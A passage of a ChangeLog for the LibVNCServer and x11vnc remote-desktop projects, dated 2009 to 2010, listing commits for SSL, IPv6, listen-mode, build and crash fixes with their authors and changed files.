	blocks where that variable is used. Also fixed non-IPv6
	connections.] Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2010-05-31  Wouter Van Meir <wouter.vanmeir@pandora.be>

	* libvncclient/vncviewer.c: Call MallocFrameBuffer before
	SetFormatAndEncodings The hook is still called after InitialiseRFBConnection() so we can
	choose the color settings depending on the vnc server (or settings)
	in that hook.  This way one can use the "VNC server default format" pixelformat if
	the client supports it, or perform a workaround (Intel AMT KVM
	"classic vnc" server only works using 8bit colors in RFB3.8) Signed-off-by: Wouter Van Meir <wouter.vanmeir@pandora.be>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-05-19  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c, libvncserver/rfbserver.c, rfb/rfb.h: 
	Implement a DisplayFinishedHook for libvncserver.  If set, this hook gets called just before rfbSendFrameBufferUpdate()
	returns.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-05-08  runge <runge@karlrunge.com>

	* ChangeLog, libvncclient/rfbproto.c: libvncclient:
	rfbResizeFrameBuffer should also set updateRect.

2010-05-08  runge <runge@karlrunge.com>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/screen.c, x11vnc/unixpw.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: x11vnc: tweaks to
	prepare_x11vnc_dist.sh. set cd->unixname in apply_opts().

2010-05-07  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Complete the AUTHORS file Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-05-07  Wouter Van Meir <wouter.vanmeir@pandora.be>

	* CMakeLists.txt: fix CMakeLists.txt: other way to find pthread
	library ... and fixed linking of the tests in the examples directory.  Signed-off-by: Wouter Van Meir <wouter.vanmeir@pandora.be>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-05-05  runge <runge@karlrunge.com>

	* classes/ssl/index.vnc, classes/ssl/proxy.vnc,
	classes/ssl/ultra.vnc, classes/ssl/ultraproxy.vnc,
	classes/ssl/ultrasigned.vnc, prepare_x11vnc_dist.sh, x11vnc/README,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: misc/etv sync.

2010-05-01  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/misc/ultravnc_repeater.pl,
	x11vnc/sslhelper.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c,
	x11vnc/xrecord.c: x11vnc: X11VNC_DISABLE_SSL_CLIENT_MODE option to
	          disable SSL client role in reverse connections.  Improvements to
	          logging in ultravnc_repeater, ULTRAVNC_REPEATER_NO_RFB option.
	          Increase SSL timeout and print message if 'repeater' mode is
	          detected for reverse SSL connection.  Fix RECORD scroll XCopyArea
	          detection with recent gtk/gdk library; set X11VNC_SCROLL_MUST_EQUAL           to disable.  Limit logging of RECORD error messages.

2010-04-28  Johannes Schindelin <johannes.schindelin@gmx.de>

	* client_examples/Makefile.am: Another try to fix the _SOURCES issue Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-04-28  Corentin Chary <corentin.chary@gmail.com>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: cmake: fix CMakeLists.txt - It's SDL_LIBRARY, not SDL_LIBRARIES - Detect GnuTLS and set the macro in rfbconfig.h - Add tls.c to libvncclient to avoid missing symbols Signed-off-by: Corentin Chary <corentin.chary@gmail.com>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-04-25  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/enc.h, x11vnc/help.c,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/sslhelper.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: incorporate new
	ultravnc_dsm_helper.c.

2010-04-18  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/stunnel-maxconn.pa
	tch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: Sync ssvncviewer changes.

2010-04-18  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/appshare.c,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/inet.c, x11vnc/inet.h,
	x11vnc/misc/connect_switch, x11vnc/misc/desktop.cgi,
	x11vnc/misc/ultravnc_repeater.pl, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/util.c, x11vnc/v4l.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xinerama.c: 
	Improvements to demo scripts. Alias -coe for -connect_or_exit.  Fix
	HAVE_V4L2. Warn no Xvfb, Xdummy, or Xvnc. Xinerama screens.

2010-04-09  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/connections.h, x11vnc/enc.h, x11vnc/help.c, x11vnc/inet.c,
	x11vnc/inet.h, x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/sslcmds.c, x11vnc/sslhelper.c,
	x11vnc/sslhelper.h, x11vnc/ssltools.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/user.c, x11vnc/util.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c, x11vnc/xinerama.c: x11vnc: exit(1) for
	-connect_or_exit failure, quiet query mode for grab_state,
	pointer_pos, etc. ipv6 support. STUNNEL_LISTEN for particular
	interface. -input_eagerly in addition to -allinput.  quiet Xinerama
	message.

2010-04-09  runge <runge@karlrunge.com>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: Improvements to
	Java viewer: troubleshooting settings and workarounds, misc bug
	fixes.

2010-04-09  runge <runge@karlrunge.com>

	* x11vnc/misc/connect_switch, x11vnc/misc/desktop.cgi,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_getpatches,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/misc/inet6to4: Synchronize ssvnc 1.0.26.
	Improvements to perl scripts desktop.cgi, connect_switch and
	inet6to4.

2010-03-21  runge <runge@karlrunge.com>

	* classes/ssl/README, classes/ssl/onetimekey,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/misc/Makefile.am, x11vnc/misc/README,
	x11vnc/misc/connect_switch, x11vnc/misc/desktop.cgi,
	x11vnc/misc/inet6to4, x11vnc/misc/panner.pl,
	x11vnc/misc/ultravnc_repeater.pl, x11vnc/remote.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: classes/ssl:
	          Many improvements to Java SSL applet, onetimekey serverCert param,
	          debugging printout, user dialogs, catch socket exceptions,
	autodetect x11vnc for GET=1.  x11vnc: misc/scripts: desktop.cgi,
	          inet6to4, panner.pl.  X11VNC_HTTPS_DOWNLOAD_WAIT_TIME, -unixpw %xxx
	          documented, and can run user cmd in UNIXPW_CMD. FD_XDMCP_IF for
	          create script, autodetect dm on udp6 only.  Queries: pointer_x,
	          pointer_y, pointer_same, pointer_root.  Switch on -xkd if keysyms
	          per key > 4 in all cases.  daemon mode improvements for
	          connect_switch, inet6to4, ultravnc_repeater.pl.  Dynamic change of
	          -clip do not create new fb if WxH is unchanged.

2010-03-21  runge <runge@karlrunge.com>

	* configure.ac: I think two HAVE_X's were missed.

2010-03-13  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c: Fix compilation
	without TLS Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-03-13  Johannes Schindelin <johannes.schindelin@gmx.de>

	* client_examples/Makefile.am, client_examples/SDLvncviewer.c: Fix
	compilation with newer automake For some reason, this developer's automake no longer understands
	_SOURCES lines anymore. Work around that.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-03-13  Johannes Schindelin <johannes.schindelin@gmx.de>

	* client_examples/Makefile.am, configure.ac: Rename HAVE_X ->
	HAVE_X11 This change is just for consistency reasons.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-02-22  runge <runge@karlrunge.com>

	* classes/ssl/README,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/scan.c,
	x11vnc/sslcmds.c, x11vnc/sslcmds.h, x11vnc/ssltools.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: classes/ssl:
	Java SSL applet viewer now works with certificate chains.  x11vnc:
	Printout option -sslScripts.  Suggest -auth guess in error message.
	Set fake_screen width and height.  Test for +kb in Xvfb.

2010-01-22  Christian Beier <dontmind@freeshell.org>

	* libvncclient/vncviewer.c: libvncclient/vncviewer.c: don't set
	serverPort in rfbInitClient().  The serverPort member is already set in rfbGetClient(), if we set it
	again in rfbInitClient(), this breaks playing of vncrec files (this
	relies on serverPort set to -1).  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-01-16  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncclient/vncviewer.c: LibVNCClient: make sure that the port is
	initialized correctly.  While at it, adjust coding style.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-01-15  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: Add UltraVNC Repeater support in libvncclient [jes: adjusted coding style, made sure port is initialized
	correctly] Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2010-01-07  runge <runge@karlrunge.com>

	* x11vnc/README, x11vnc/misc/Xdummy, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: add modeline creation to Xdummy.

2010-01-07  Christian Beier <dontmind@freeshell.org>

	* libvncserver/font.c: libvncserver/font.c: add some checks to
	rfbDrawChar().  In some cases (bad font data) the coordinates evaluate to <0,
	causing a segfault in the following memcpy().  [jes: keep the offset, but do not try to segfault] Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-01-07  Christian Beier <dontmind@freeshell.org>

	* vncterm/LinuxVNC.c: LinuxVNC: Fix for no input possible because of
	ctrl key being stuck.  Issue was reported as Debian bug ##555988,
	http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=555988 Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-01-04  Christian Beier <dontmind@freeshell.org>

	* vncterm/LinuxVNC.c, vncterm/VNConsole.c: LinuxVNC: fix segfault at
	"linuxvnc 1 -help".  This fixes Debian Bug #399501: Switch to tty1.  Run "linuxvnc 1
	-help".  You see help text, followed by "Segmentation fault".  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-01-02  runge <runge@karlrunge.com>

	* x11vnc/8to24.c, x11vnc/8to24.h, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/allowed_input_t.h, x11vnc/appshare.c, x11vnc/avahi.c,
	x11vnc/avahi.h, x11vnc/blackout_t.h, x11vnc/cleanup.c,
	x11vnc/cleanup.h, x11vnc/connections.c, x11vnc/connections.h,
	x11vnc/cursor.c, x11vnc/cursor.h, x11vnc/enc.h, x11vnc/enums.h,
	x11vnc/gui.c, x11vnc/gui.h, x11vnc/help.c, x11vnc/help.h,
	x11vnc/inet.c, x11vnc/inet.h, x11vnc/keyboard.c, x11vnc/keyboard.h,
	x11vnc/linuxfb.c, x11vnc/linuxfb.h, x11vnc/macosx.c,
	x11vnc/macosx.h, x11vnc/macosxCG.c, x11vnc/macosxCG.h,
	x11vnc/macosxCGP.c, x11vnc/macosxCGP.h, x11vnc/macosxCGS.c,
	x11vnc/macosxCGS.h, x11vnc/misc/README, x11vnc/misc/Xdummy,
	x11vnc/misc/rx11vnc, x11vnc/misc/rx11vnc.pl, x11vnc/options.c,
	x11vnc/options.h, x11vnc/params.h, x11vnc/pm.c, x11vnc/pm.h,
	x11vnc/pointer.c, x11vnc/pointer.h, x11vnc/rates.c, x11vnc/rates.h,
	x11vnc/remote.c, x11vnc/remote.h, x11vnc/scan.c, x11vnc/scan.h,
	x11vnc/screen.c, x11vnc/screen.h, x11vnc/scrollevent_t.h,
	x11vnc/selection.c, x11vnc/selection.h, x11vnc/solid.c,
	x11vnc/solid.h, x11vnc/sslcmds.c, x11vnc/sslcmds.h,
	x11vnc/sslhelper.c, x11vnc/sslhelper.h, x11vnc/ssltools.h,
	x11vnc/uinput.c, x11vnc/uinput.h, x11vnc/unixpw.c, x11vnc/unixpw.h,
	x11vnc/user.c, x11vnc/user.h, x11vnc/userinput.c,
	x11vnc/userinput.h, x11vnc/util.c, x11vnc/util.h, x11vnc/v4l.c,
	x11vnc/v4l.h, x11vnc/win_utils.c, x11vnc/win_utils.h,
	x11vnc/winattr_t.h, x11vnc/x11vnc.1, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xdamage.h,
	x11vnc/xevents.c, x11vnc/xevents.h, x11vnc/xinerama.c,
	x11vnc/xinerama.h, x11vnc/xkb_bell.c, x11vnc/xkb_bell.h,
	x11vnc/xrandr.c, x11vnc/xrandr.h, x11vnc/xrecord.c,
	x11vnc/xrecord.h, x11vnc/xwrappers.c, x11vnc/xwrappers.h: x11vnc:
	small tweaks to Xdummy, rx11vnc*.  Apply SMALL_FOOTPRINT to
	-appshare text.  Copyright year change.

2010-01-02  runge <runge@karlrunge.com>

	* libvncserver/tightvnc-filetransfer/rfbtightserver.c: year++;

2010-01-02  runge <runge@karlrunge.com>

	* ChangeLog, libvncserver/tightvnc-filetransfer/rfbtightserver.c: 
	tightvnc-filetransfer/rfbtightserver.c: enabled fix for tight
	security type for RFB 3.8 (debian bug 517422.)

2010-01-01  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: Add support for viewers to select security types on
	demand Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2009-12-29  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/misc/Xdummy, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: rename -create_x to -create_xsrv.
	Hopefully done fixing Xdummy.

2009-12-28  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/appshare.c,
	x11vnc/misc/Xdummy, x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/remote.c, x11vnc/solid.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: Fix problems in
	--without-x builds.  Fix crash with -QD query for dbus info.  Adjust
	window size for small screens in -gui.  Improve F1 help for xdm,
	etc.  include ssvnc 1.0.25 source.

2009-12-24  runge <runge@karlrunge.com>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/help.c, x11vnc/misc/Xdummy, x11vnc/ssltools.h,
	x11vnc/unixpw.c, x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: prepare_x11vnc_dist.sh for 0.9.10.
	        -xdummy_xvfb, -svc_xdummy_xvfb and -create_x shorthand. lxde
	        session.  Xdummy improvements and root no longer required.

2009-12-20  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c: Fix version checking (>=3.8) for
	rfbVncAuthOK confirmation when no password required It seems that vino does not send AuthOK  when there is no password
	with anonymous TLS, and it seems that vino is the only <3.8 VNC
	server that handles anonymous TLS at all, so let's not wait for the
	packet that will never come.  Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2009-12-21  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/sslhelper.c,
	x11vnc/ssltools.h, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: -DENC_HAVE_OPENSSL=0 to disable enc.h
	        but still have ssl. Tweak ps command in find_display. Try to handle         AIX su. Ignore an initial newline at login: for -unixpw.

2009-12-18  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog: ChangeLog typo

2009-12-18  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/unixpw.c,
	x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: Add tag=... to unixpw opts to set FD_TAG.
	Prefer Xvfb over Xdummy.  Reduce wait time for https. Add 'Login
	succeeded' output to unixpw panel.

2009-12-18  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/remote.c, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: fix keycode and other
	        remote control actions under DIRECT: with an extra XFlush and other
	        safety measures.  fflush(stderr) much in su_verify.  Make the
	        -unixpw env. vars UNIXPW_DISABLE_SSL and UNIXPW_DISABLE_LOCALHOST
	        work correctly.  Make -loopbg actually imply -bg.

2009-12-15  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/inet.c,
	x11vnc/misc/Makefile.am, x11vnc/misc/connect_switch,
	x11vnc/misc/ultravnc_repeater.pl, x11vnc/options.c,
	x11vnc/options.h, x11vnc/pointer.c, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/ssltools.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xdamage.c, x11vnc/xevents.c: X props names via env var.
	fakebuttonevent action, connect_switch and ultravnc_repeater.pl
	scripts, find_display try FD_XDM on failure, -quiet and -storepasswd
	changes, better port 113 testing.

2009-12-07  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c, x11vnc/help.c,
	x11vnc/remote.c, x11vnc/screen.c, x11vnc/sslhelper.c,
	x11vnc/ssltools.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: X11VNC_EXTRA_HTTPS_PARAMS,
	X11VNC_HTTP_LISTEN_LOCALHOST, X11VNC_REOPEN_SLEEP_MAX,
	-findauth/-auth guess FD_XDM=1 for root, work around xhost
	SI:localuser:root.

2009-12-05  runge <runge@karlrunge.com>

	* classes/ssl/ss_vncviewer,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/appshare.c, x11vnc/gui.c,
	x11vnc/unixpw.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: Update java
	and scripts in classes/ssl.  x11vnc: declare crypt() on all
	platforms.  more wishes.

2009-12-02  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README,
	x11vnc/appshare.c, x11vnc/connections.c, x11vnc/cursor.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/pm.c, x11vnc/pointer.c, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/sslhelper.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/util.c, x11vnc/util.h,
	x11vnc/win_utils.c, x11vnc/win_utils.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xinerama.c, x11vnc/xrandr.c: x11vnc: -appshare mode for
	sharing an application windows instead of the entire desktop. map
	port + 5500 in reverse connect.  Add id_cmd remote control functions
	for id (and other) windows.  Allow zero port in SSL reverse
	connections.  Adjust delays between multiple reverse connections;
	X11VNC_REVERSE_SLEEP_MAX env var.  Add some missing mutex locks; add
	INPUT_LOCK and threads_drop_input.  More safety in -threads mode for
	new framebuffer change.  Fix some stderr leaking in -inetd mode.

2009-12-01  runge <runge@karlrunge.com>

	* libvncserver/cursor.c, libvncserver/sockets.c,
	libvncserver/translate.c: Add locks of updateMutex in
	rfbRedrawAfterHideCursor() and rfbSetClientColourMap().  Up listen
	limit from 5 to 32.

2009-11-18  runge <runge@karlrunge.com>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: ssvnc/enhanced_tightvnc_viewer update.

2009-11-18  runge <runge@karlrunge.com>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/cursor.h,
	x11vnc/enc.h, x11vnc/help.c, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/selection.c, x11vnc/solid.c, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xevents.h: x11vnc:
	-findauth, -auth guess, & etc.

2009-11-11  Christian Beier <dontmind@freeshell.org>

	* libvncclient/listen.c, rfb/rfbclient.h: libvncclient: better
	return value for non-forking listen.  The return value now better reflects what has happened: 1 on success
	(incoming connection on listen socket, we accepted it successfully),
	-1 on error, 0 on timeout.  Also change the select calls to not check _all_ possible file
	descriptors.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-11-05  Christian Beier <dontmind@freeshell.org>

	* libvncclient/listen.c, libvncclient/rfbproto.c,
	libvncclient/vncviewer.c, libvncserver/rfbserver.c: Fix checks for
	socket values, 0 is a legal value.  To make this work, we also have to initialize sockets to a default
	value of -1.  Also close a client listen socket if it's open.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-31  Christian Beier <dontmind@freeshell.org>

	* libvncclient/vncviewer.c: libvncclient: include winsock2.h in
	vncviewer.c.  fixes warning about closesocket being implicitly declared.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-11-05  Vic Lee <llyzs@163.com>

	* configure.ac: Change GnuTLS minimum requirement to 2.4.0 Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2009-11-04  Vic Lee <llyzs@163.com>

	* client_examples/ppmtest.c, examples/example.c,
	libvncclient/sockets.c, libvncclient/zrle.c, libvncserver/cursor.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c,
	vncterm/VNConsole.c: Fix various compilation warnings Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2009-10-07  Vic Lee <llyzs@163.com>

	* libvncclient/rfbproto.c, libvncserver/vncauth.c, rfb/rfbclient.h,
	rfb/rfbproto.h: Add MSLogon security type Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2009-10-31  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Add Alexander to the authors Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-31  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: don't call clean up
	the same client twice.  If rfbInitConnection fails, it cleans up the client, so protect
	against doing it ourselves again.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-30  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: add SIGINT handler
	to be able to actually stop program.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-26  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: use -listennofork
	when -listen specified.  As -listen mode isn't really working under UNIX and not at all under
	windows, use -listennofork and an outer listen loop instead.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-26  Christian Beier <dontmind@freeshell.org>

	* libvncclient/listen.c, libvncclient/vncviewer.c, rfb/rfbclient.h: 
	libvncclient: add a non-forking listen function.  Forking the whole process from deep within a library call does not
	really work at all with apps that use multiple threads, i.e. every
	reasonably modern GUI app. So, provide a non-forking listen function
	so that the caller can decide if to fork, start a thread, etc.  This implementation adds a timeout parameter to be able to call the
	listen function multiple times so that it's possible to do sth. else
	in between, e.g. abort listening.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-21  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: make listen mode
	work _somewhat_.  set the port to listen on and really ensure that the window of the
	fork()ed instance is closed.  works somewhat: it's now actually possible to listen for an incoming
	connection and to close it again, but the second connection attempt
	fails with 'XIO:  fatal IO error 11 (Resource temporarily
	unavailable)'. this could relate to the fact that SDL uses threads
	internally and we're fork()ing here...  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2009-10-30  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: libvncclient: make listenAtTCPPort() work
	under windows.  Actually, initSockets() has to be called everywhere we possibly use
	sockets the first time.  Also fix return value of initSockets().  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

